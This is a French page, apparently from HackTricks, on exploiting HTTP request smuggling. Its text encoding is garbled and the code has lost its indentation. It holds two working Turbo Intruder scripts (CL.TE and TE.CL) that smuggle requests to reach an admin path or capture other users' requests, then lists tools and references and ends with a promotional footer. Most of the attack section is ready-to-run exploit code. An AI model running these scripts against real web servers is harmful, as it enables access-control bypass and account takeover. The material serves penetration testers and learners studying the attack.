Avez-vous trouvÃ© une vulnÃ©rabilitÃ© de Smuggling de requÃªtes HTTP et vous ne savez pas comment l'exploiter ? Essayez cette autre mÃ©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basÃ© sur la grammaire utile pour trouver des incohÃ©rences Ã©tranges dans le trafic de requÃªtes.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
